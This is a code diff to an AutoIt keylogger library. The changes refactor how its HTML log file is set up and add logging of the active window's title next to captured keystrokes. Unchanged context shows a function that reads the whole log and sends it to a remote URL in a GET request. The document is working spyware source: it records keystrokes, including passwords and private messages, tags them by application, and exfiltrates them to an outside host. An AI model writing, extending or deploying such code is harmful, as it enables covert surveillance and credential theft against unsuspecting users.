@@ -34,6 +34,7 @@ Global $last = ""			; The pressed Key in the last iteration
 Global $pressed = False		; A boolean to indicate whether a key was pressed in an iteration
 Global $wait_time = 22 		; The time to wait between iterations (in milliseconds)
 Global $file_path = ""		; The path of the file
+Global $active_window = ""	; The last active window
 Opt("WinTitleMatchMode", 2) ; Setting the WinTitleMatchMode for window-logging
 
 ; Initializes the HTML-File
@@ -44,8 +45,7 @@ Func _init($path)
 	If not StringCompare($path, "") Then $Seperator = ""
 	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year ; The filename will result in something like this: 26_116_90630
 	Global $File = FileOpen($file_path, $FO_APPEND)
-	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
-	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
+	_initFileContent()
 EndFunc
 
 ; Initializes the HTML-File with a specified name and all global Variables
@@ -56,17 +56,33 @@ Func _initWithFilename($path, $filename)
 	If not StringCompare($path, "") Then $Seperator = ""
 	$file_path = $path&$Seperator&$filename
 	Global $File = FileOpen($file_path, $FO_APPEND) ; The file
-	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>')
-	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
+	_initFileContent()
+EndFunc
+
+; Initializes the content of the file
+Func _initFileContent()
+	$Date=@mday&"."&@mon&"."&@year
+	$Time=@hour&":"&@min&":"&@sec
+	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h3{color: blue;}aw{color: blue;}</style></head><body>')
+	FileWrite($File,  "<h3>" & @ComputerName & " on " & @OSVersion & "<br>Date: " & $Date & "<br>Time: " & $Time & "</h3>")
 EndFunc
 
 ; Writes the last key to the file
-Func _writeToFile()
+Func _writeKeyToFile()
+	If $active_window <> WinGetTitle("[ACTIVE]") Then
+		$active_window = WinGetTitle("[ACTIVE]")
+		_writeToFile("<br><br><aw>" & $active_window & "</aw><br>")
+	EndIf
 	If StringLen($key) > 1 Then	; If the String is longer than 1, the pressed key cannot be a letter or number. It has to be a special key
 		FileWrite($File, "<sc>_" & $key & "_</sc>") ; Special keys are surrounded with the <sc> tag
 	Else
 		FileWrite($File, $key)
 	EndIF
+EndFunc
+
+; Writes a string to the file
+Func _writeToFile($content)
+	FileWrite($File, $content)
 EndFunc
 
 ; Returns the pressed key at the moment
@@ -409,7 +425,7 @@ Func _read()
    $last = $key
    _getPressedKey()
    If $pressed Then
-	  If ($last <> $key) Then _writeToFile()
+	  If ($last <> $key) Then _writeKeyToFile()
    EndIf
    Sleep($wait_time) ; Waiting just to keep the CPU-usage at a minimum
 EndFunc
@@ -450,7 +466,7 @@ Func _send($url)
 	FileClose($File) 					; The File is still opened in writing-mode so it is closed to...
 	$File = FileOpen($file_path, $FO_UTF8)	; ...open in read-mode again
 	$content = FileRead($File)
-	InetRead($url & "?content=" & $content) ; The name is needed to identify where the logs are coming from
+	InetRead($url & "?content=" & $content) ; Sending the content via GET
 	FileClose($File)
 	$File = FileOpen($file_path, $FO_APPEND)
 EndFunc
